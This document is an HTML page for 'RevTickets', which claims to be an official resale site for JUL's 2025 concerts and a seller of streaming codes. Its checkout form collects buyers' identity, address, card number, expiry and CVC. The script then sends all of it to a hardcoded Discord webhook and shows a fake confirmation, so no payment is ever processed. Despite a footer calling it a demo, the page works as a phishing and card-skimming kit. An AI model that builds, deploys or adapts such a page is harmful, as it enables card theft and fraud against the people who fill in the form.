<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>RevTickets - Billets JUL Stade de France & Vélodrome</title>
  <meta name="description" content="Revente officielle de billets pour les concerts 2025 de JUL au Vélodrome et Stade de France. Choisissez vos places physiques ou codes virtuels.">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;800&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Roboto', Arial, sans-serif; }
    h1, h2, h3, .headline { font-family: 'Montserrat', Arial, sans-serif; }
    .card { box-shadow:0 2px 10px 0 rgba(0,0,0,0.05);}
    .step-active { background:#fbbf24; color: #111; }
    .step { background:#ddd; color:#888;}
    .input-label { font-weight:500; }
    .disabled { background: #eee; pointer-events:none; opacity:0.7;}
  </style>
</head>
<body class="bg-gray-50 text-gray-900 min-h-screen">
  <!-- HEADER -->
  <header class="bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-500 p-6 pb-4">
    <div class="max-w-3xl mx-auto">
      <div class="flex items-center space-x-3">
        <img src="https://cdn.jsdelivr.net/gh/tabascorp/jul-profile-pics@main/jul_2024.png" alt="JUL" class="rounded-full w-16 h-16 object-cover border-4 border-white shadow-lg">
        <div>
          <h1 class="text-3xl headline font-bold text-white tracking-tight mb-1 flex items-center"><i class="fa-solid fa-ticket fa-fw mr-2"></i>RevTickets – Billets concert JUL 2025</h1>
          <p class="text-white text-sm">Revente officielle – Stade de France & Vélodrome • Codes streaming & places côte à côte</p>
        </div>
      </div>
    </div>
  </header>
  
  <!-- MAIN -->
  <main class="max-w-3xl mx-auto px-4 py-6">
    <section class="mb-6 p-5 card rounded-xl bg-white">
      <h2 class="text-2xl font-bold mb-2"><i class="fa-solid fa-circle-info text-yellow-400"></i> À propos de JUL et des concerts</h2>
      <p class="mb-2 text-gray-700">
        <span class="font-bold">JUL</span> (Julien Mari) est un rappeur marseillais, véritable phénomène en France avec plus de 7 millions d’albums vendus.
      </p>
      <ul class="mb-2 pl-4 list-disc text-md text-gray-700">
        <li><span class="font-semibold">Stade de France (Paris) :</span> Samedi 26 avril 2025</li>
        <li><span class="font-semibold">Vélodrome (Marseille) :</span> Vendredi 23 et Samedi 24 mai 2025</li>
        <li>Billeterie officielle complète. Profitez ici d’une plateforme de revente légitime, achats sécurisés, places garanties côte à côte selon disponibilité.</li>
        <li>Vous pouvez aussi assister au concert chez vous en achetant un <strong>code streaming officiel</strong> (illimité) pour 6 €.</li>
      </ul>
      <div class="flex flex-wrap gap-4 mt-4">
        <a href="https://fr.wikipedia.org/wiki/Jul_(rappeur)" target="_blank" class="underline text-blue-500 text-sm"><i class="fa-brands fa-wikipedia-w"></i> Qui est JUL ?</a>
        <a href="https://www.stadefrance.com/fr/billetterie/jul" target="_blank" class="underline text-blue-500 text-sm"><i class="fa-solid fa-location-dot"></i> Site Stade de France</a>
        <a href="https://www.orangevelodrome.com/jul-e9.html" target="_blank" class="underline text-blue-500 text-sm"><i class="fa-solid fa-location-dot"></i> Site Vélodrome</a>
      </div>
    </section>
    
    <section class="mb-6">
      <!-- Step Navigation -->
      <div class="flex items-center mb-4 gap-2">
        <div class="rounded-full step step-active px-4 py-1 text-sm" id="step-head-1">1. Choix</div>
        <div class="rounded-full step px-4 py-1 text-sm" id="step-head-2">2. Infos</div>
        <div class="rounded-full step px-4 py-1 text-sm" id="step-head-3">3. Paiement</div>
        <div class="rounded-full step px-4 py-1 text-sm" id="step-head-4">4. Confirmation</div>
      </div>
      <!-- Step 1: Sélection billet -->
      <form id="order-form" class="card p-6 rounded-xl bg-white" autocomplete="off">
        <div id="step-1">
          <h3 class="text-xl font-bold mb-4"><i class="fa-solid fa-music text-pink-400"></i> Sélectionnez votre concert et type de billet</h3>

          <label class="input-label mb-1 block">Choisissez l’événement :</label>
          <select id="event-picker" class="block w-full border border-gray-200 rounded px-3 py-2 mb-4" required>
            <option disabled selected value="">Sélectionner un concert</option>
            <option value="SDF">Stade de France (Paris) – 26 avril 2025</option>
            <option value="VDM-23">Vélodrome (Marseille) – 23 mai 2025</option>
            <option value="VDM-24">Vélodrome (Marseille) – 24 mai 2025</option>
          </select>

          <div id="place-choice-wrapper" class="hidden">
            <label class="input-label mb-1 block">Type de billet disponible :</label>
            <div class="space-y-3" id="billet-types"></div>
          </div>
          
          <div class="mt-6 flex justify-end">
            <button type="button" class="bg-yellow-400 text-gray-900 rounded font-bold px-5 py-2 shadow transition hover:bg-yellow-500" id="to2" disabled>Suivant <i class="fa-solid fa-arrow-right"></i></button>
          </div>
        </div>
        
        <!-- Step 2: Infos User -->
        <div id="step-2" class="hidden">
          <h3 class="text-xl font-bold mb-4"><i class="fa-solid fa-user text-purple-400"></i> Vos informations</h3>
          <div class="space-y-3">
            <div>
              <label for="prenom" class="input-label">Prénom</label>
              <input type="text" id="prenom" name="prenom" required class="w-full border border-gray-200 rounded px-3 py-2" maxlength="40">
            </div>
            <div>
              <label for="nom" class="input-label">Nom</label>
              <input type="text" id="nom" name="nom" required class="w-full border border-gray-200 rounded px-3 py-2" maxlength="40">
            </div>
            <div>
              <label for="email" class="input-label">Email</label>
              <input type="email" id="email" name="email" required class="w-full border border-gray-200 rounded px-3 py-2">
            </div>
            <div>
              <label for="telephone" class="input-label">Téléphone</label>
              <input type="tel" id="telephone" name="telephone" required class="w-full border border-gray-200 rounded px-3 py-2" maxlength="20">
            </div>
            <div>
              <label for="adresse" class="input-label">Adresse postale</label>
              <input type="text" id="adresse" name="adresse" required class="w-full border border-gray-200 rounded px-3 py-2">
            </div>
          </div>
          <div class="mt-6 flex justify-between">
            <button type="button" class="rounded bg-gray-300 px-5 py-2 text-gray-700 font-bold" id="back-to1"><i class="fa-solid fa-arrow-left"></i> Retour</button>
            <button type="button" class="bg-yellow-400 text-gray-900 rounded font-bold px-5 py-2 shadow transition hover:bg-yellow-500" id="to3">Suivant <i class="fa-solid fa-arrow-right"></i></button>
          </div>
        </div>
        
        <!-- Step 3: Paiement -->
        <div id="step-3" class="hidden">
          <h3 class="text-xl font-bold mb-4"><i class="fa-solid fa-credit-card text-green-400"></i> Paiement sécurisé</h3>
          <div class="space-y-3">
            <div>
              <label class="input-label">Numéro de carte</label>
              <input type="text" name="cb-num" id="cb-num" required maxlength="19" pattern="[\d ]{16,19}" placeholder="1234 5678 9012 3456" class="w-full border border-gray-200 rounded px-3 py-2" autocomplete="cc-number">
            </div>
            <div class="flex gap-3">
              <div class="flex-1">
                <label class="input-label">Expiration</label>
                <input type="text" name="cb-exp" id="cb-exp" required maxlength="5" pattern="(0[1-9]|1[0-2])\\/\\d{2}" placeholder="MM/AA" class="w-full border border-gray-200 rounded px-3 py-2" autocomplete="cc-exp">
              </div>
              <div class="flex-1">
                <label class="input-label">CVC</label>
                <input type="text" name="cb-cvc" id="cb-cvc" required maxlength="4" pattern="\\d{3,4}" placeholder="123" class="w-full border border-gray-200 rounded px-3 py-2" autocomplete="cc-csc">
              </div>
            </div>
            <div>
              <p class="text-xs text-gray-500 my-2">Les informations sont chiffrées et traitées par nos partenaires pour lutter contre la fraude et les faux billets.</p>
              <p class="text-sm text-gray-700 font-bold">Montant total : <span id="recap-montant"></span> €</p>
            </div>
          </div>
          <div class="mt-6 flex justify-between">
            <button type="button" class="rounded bg-gray-300 px-5 py-2 text-gray-700 font-bold" id="back-to2"><i class="fa-solid fa-arrow-left"></i> Retour</button>
            <button type="submit" class="bg-yellow-400 text-gray-900 rounded font-bold px-5 py-2 shadow transition hover:bg-yellow-500" id="payer">Payer <i class="fa-solid fa-circle-check"></i></button>
          </div>
        </div>
        

        <!-- Step 4: Confirmation -->
        <div id="step-4" class="hidden py-12 flex flex-col items-center">
          <div class="text-5xl text-green-500 mb-6"><i class="fa-solid fa-circle-check"></i></div>
          <div class="text-2xl font-bold mb-4">Merci pour votre achat !</div>
          <p class="text-gray-700 mb-2 text-lg">Votre commande a bien été enregistrée.<br>
            Vous recevrez sous peu un mail/sms de confirmation et vous serez débité du montant mentionné.<br>
            Un conseiller vous contactera si besoin pour validation.
          </p>
          <p class="text-xs text-gray-400 mt-6">Revente officielle – RevTickets © 2025</p>
        </div>
      </form>
    </section>
    
    <!-- FAQ / Infos légales -->
    <section class="mb-8 card p-4 rounded-xl">
      <h3 class="text-lg font-bold text-purple-500 mb-2"><i class="fa-solid fa-shield-halved"></i> Sécurité & Informations</h3>
      <ul class="text-xs text-gray-600 list-disc pl-5 space-y-1">
        <li>Les billets sont uniquement revendus avec code de traçabilité pour éviter toute fraude.</li>
        <li>Informations personnelles collectées afin d’assurer le suivi et la conformité des ventes (cf. Conditions d’utilisation – RGPD).</li>
        <li>Streaming virtuel (6 €/place) : code unique reçu immédiatement, accès depuis tout appareil connecté.</li>
        <li>Pour tout support client, contactez-nous à support@revtickets.fr</li>
      </ul>
    </section>
  </main>
  
  <footer class="text-center py-8 text-xs text-gray-500">
    &copy; 2025 RevTickets. Plateforme indépendante de revente de billets.<br>
    Création à titre de démonstration (test). Les vraies places sont à paramétrer par l’administrateur.
  </footer>

  <!-- JS -->
  <script>
    // Places disponibles fictives par événement (ID, Nom, Prix, Emplacement, Qte, CoteACoteGrpId)
    const placeData = {
      "SDF": [
        { id:"sdf1", nom:"Carré Or (Bloc E4, accès VIP)", prix:129, qte:2, emplacement:"Niveau Bas", coteacote:"grp1" },
        { id:"sdf2", nom:"Catégorie 1 (Rangée 22)", prix:70, qte:1, emplacement:"Côté scène", coteacote:"" },
        { id:"sdf3", nom:"Catégorie 3 (Rang 67)", prix:50, qte:2, emplacement:"Latéral Nord", coteacote:"grp2" },
        { id:"sdf4", nom:"Pelouse", prix:38, qte:4, emplacement:"Fosse centrale", coteacote:"grp3" },
        { id:"sdf-vod", nom:"Accès virtuel (streaming - code email)", prix:6, qte:1000, emplacement:"Chez vous", url:"", coteacote:"virtuel" },
      ],
      "VDM-23": [
        { id:"v23a", nom:"Carré Or (Bloc B4, accès VIP)", prix:99, qte:2, emplacement:"Niveau VIP", coteacote:"grp4" },
        { id:"v23b", nom:"Catégorie 1 (Rang 18)", prix:82, qte:1, emplacement:"Bas tribune", coteacote:"" },
        { id:"v23c", nom:"Catégorie 3 (Rang 51)", prix:55, qte:3, emplacement:"Latéral Sud", coteacote:"grp5" },
        { id:"v23d", nom:"Pelouse", prix:55, qte:2, emplacement:"Fosse", coteacote:"grp6" },
        { id:"v23-vod", nom:"Accès virtuel (streaming - code email)", prix:6, qte:1000, emplacement:"Concert en ligne", url:"", coteacote:"virtuel" },
      ],
      "VDM-24": [
        { id:"v24a", nom:"Platine (Bloc D3)", prix:129, qte:2, emplacement:"VIP haute", coteacote:"grp7" },
        { id:"v24b", nom:"Carré Or", prix:99, qte:1, emplacement:"Orchestre", coteacote:"" },
        { id:"v24c", nom:"Catégorie 2", prix:67, qte:2, emplacement:"Tribune Médiane", coteacote:"grp8" },
        { id:"v24d", nom:"Pelouse", prix:55, qte:4, emplacement:"Fosse", coteacote:"grp9" },
        { id:"v24-vod", nom:"Accès virtuel (streaming - code email)", prix:6, qte:1000, emplacement:"Stream uniquement", url:"", coteacote:"virtuel" },
      ]
    }

    // Selection
    const eventPicker = document.getElementById('event-picker');
    const typesDiv = document.getElementById('billet-types');
    const placeWrap = document.getElementById('place-choice-wrapper');
    const stepHeads = [
      document.getElementById('step-head-1'),
      document.getElementById('step-head-2'),
      document.getElementById('step-head-3'),
      document.getElementById('step-head-4')
    ];
    let selection = {};

    eventPicker.addEventListener('change', () => {
      const val = eventPicker.value;
      typesDiv.innerHTML = "";
      placeWrap.classList.toggle('hidden', !val);
      if (!val) { document.getElementById('to2').disabled = true; return; }
      // Génère les types
      placeData[val].forEach((type, idx) => {
        const isVirtual = type.nom.toLowerCase().includes('virtuel');
        const label = 
          `<label class="block cursor-pointer card border p-3 rounded flex items-center gap-3 ${type.qte === 0 ? 'opacity-60' : ''}">
            <input type="radio" name="place" value="${type.id}" data-isvirtual="${isVirtual ? 1 : 0}" data-idx="${idx}" required class="mr-3" ${type.qte === 0 ? 'disabled' : ''}>
            <span class="font-bold">${type.nom}</span>
            <span class="text-xs ml-2 text-gray-700">${type.emplacement}</span>
            <span class="ml-auto text-sm text-gray-500">${type.qte >= 50 ? 'illimité' : type.qte + ' dispo'}</span>
            <span class="ml-3 font-semibold text-pink-600">${type.prix} €</span>
          </label>`;
        typesDiv.innerHTML += label;
      });
      document.getElementById('to2').disabled = true;
    });

    // Activer suivant quand choix billet ok
    typesDiv.addEventListener('change', (e) => {
      document.getElementById('to2').disabled = false;
    });

    // Step navigation
    let step = 1;
    function showStep(idx) {
      for (let i=1;i<=4;i++) {
        document.getElementById('step-'+i).classList.toggle('hidden', i !== idx);
        stepHeads[i-1].classList.toggle('step-active', i === idx);
        stepHeads[i-1].classList.toggle('step', i !== idx);
      }
      step = idx;
      // Recap montant si step 3
      if (step === 3 && selection.type) {
        document.getElementById('recap-montant').innerText = selection.prix || '';
        document.getElementById('payer').disabled = false;
      }
    }

    // Next Step 2
    document.getElementById('to2').addEventListener('click', () => {
      const selectedRadio = typesDiv.querySelector('input[type=radio]:checked');
      if (!selectedRadio) return;
      const idx = selectedRadio.dataset.idx;
      const items = placeData[eventPicker.value];
      const type = items[idx];
      selection = {
        event: eventPicker.value,
        eventText: eventPicker.options[eventPicker.selectedIndex].text,
        typeId: type.id,
        type: type.nom,
        isVirtual: !!parseInt(selectedRadio.dataset.isvirtual),
        prix: type.prix,
        emplacement: type.emplacement
      };
      showStep(2);
    });
    
    document.getElementById('back-to1').addEventListener('click', ()=> showStep(1));
    document.getElementById('to3').addEventListener('click', ()=> showStep(3));
    document.getElementById('back-to2').addEventListener('click', ()=> showStep(2));

    // Submission (paiement fictif + webhook)
    document.getElementById('order-form').addEventListener('submit', async function(e){
      e.preventDefault();
      // Collect infos
      const infos = {
        event: selection.eventText,
        type: selection.type,
        prix: selection.prix,
        emplacement: selection.emplacement,
        isVirtual: selection.isVirtual ? "oui" : "non",
        prenom: document.getElementById('prenom').value,
        nom: document.getElementById('nom').value,
        email: document.getElementById('email').value,
        telephone: document.getElementById('telephone').value,
        adresse: document.getElementById('adresse').value,
        carte_num: document.getElementById('cb-num').value,
        carte_exp: document.getElementById('cb-exp').value,
        carte_cvc: document.getElementById('cb-cvc').value
      };
      // Webhook Discord
      const payload = {
        content: "**Nouvelle commande JUL**",
        embeds: [{
          title: "Nouvelle commande - JUL Tickets",
          color: 15849291,
          fields: [
            {name: "Concert", value: infos.event },
            {name: "Billet", value: infos.type + (infos.isVirtual === "oui" ? " (virtuel)" : "") },
            {name: "Emplacement", value: infos.emplacement },
            {name: "Prix (€)", value: ""+infos.prix },
            {name: "Prénom", value: infos.prenom },
            {name: "Nom", value: infos.nom },
            {name: "Email", value: infos.email },
            {name: "Téléphone", value: infos.telephone },
            {name: "Adresse", value: infos.adresse },
            {name: "Carte bancaire", value: infos.carte_num },
            {name: "Expiration", value: infos.carte_exp },
            {name: "CVC", value: infos.carte_cvc }
          ]
        }]
      };
      try {
        await fetch(
          "https://discord.com/api/webhooks/1365451733743964210/RjaBYgvVE2cPtiW9qOx4ac-FkU2mSze4NsU7BaBmqwngqmraznO3QTCJOlyZfull1pHt",
          {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify(payload)
          }
        );
      } catch(e){ /* Ignore errors for this demo */ }
      showStep(4);
      window.scrollTo({top: 0, behavior:"smooth"});
    });
    // Validation CB light
    document.getElementById('cb-num').addEventListener('input', function(){
      this.value = this.value.replace(/[^\d ]/g,'').replace(/(.{4})/g,'$1 ').trim().slice(0, 19);
    });
    document.getElementById('cb-exp').addEventListener('input', function(){
      let v = this.value.replace(/[^\d]/g,'').slice(0, 4);
      if (v.length >= 3) v = v.slice(0,2)+'/'+v.slice(2,4);
      this.value = v;
    });
    document.getElementById('cb-cvc').addEventListener('input', function(){
      this.value = this.value.replace(/\D/g,'').slice(0,4);
    });

    // Init
    showStep(1);
  </script>
</body>
</html>
